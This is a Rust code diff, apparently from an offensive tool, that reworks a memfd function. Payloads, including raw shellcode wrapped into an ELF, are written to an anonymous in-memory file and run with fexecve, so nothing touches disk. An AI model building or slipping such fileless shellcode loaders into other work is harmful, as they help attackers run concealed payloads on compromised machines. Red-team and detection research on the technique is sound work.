@@ -9,6 +9,7 @@ use nix::sys::wait::waitpid;
 use nix::unistd;
 use nix::unistd::{execve, fexecve, fork, ForkResult};
 
+use crate::elf::create_elf;
 use crate::utils::{get_env, str_to_vec_c_string};
 use crate::{Payload, PayloadType};
 
@@ -62,23 +63,21 @@ pub fn memfd(payload: Payload) -> Result<(), Errno> {
 
     let fd = memfd_create(p_file_name, MemFdCreateFlag::MFD_CLOEXEC)?;
 
-    match payload.payload_type {
-        PayloadType::Executable => {
-            unistd::write(&fd, payload.bytes.as_slice())?;
+    let bytes = match payload.payload_type {
+        PayloadType::Executable => payload.bytes,
+        PayloadType::Shellcode => create_elf(&payload.bytes),
+    };
 
-            let mut args = str_to_vec_c_string(&payload.name);
-            args.append(&mut str_to_vec_c_string(&payload.args));
-            let args_slice = args.as_slice();
+    unistd::write(&fd, &bytes)?;
 
-            let env = get_env();
-            let env_slice = env.as_slice();
+    let mut args = str_to_vec_c_string(&payload.name);
+    args.append(&mut str_to_vec_c_string(&payload.args));
+    let args_slice = args.as_slice();
 
-            fexecve(fd.as_raw_fd(), args_slice, env_slice)?;
-        }
-        PayloadType::Shellcode => {
-            todo!()
-        }
-    }
+    let env = get_env();
+    let env_slice = env.as_slice();
+
+    fexecve(fd.as_raw_fd(), args_slice, env_slice)?;
 
     Ok(())
 }
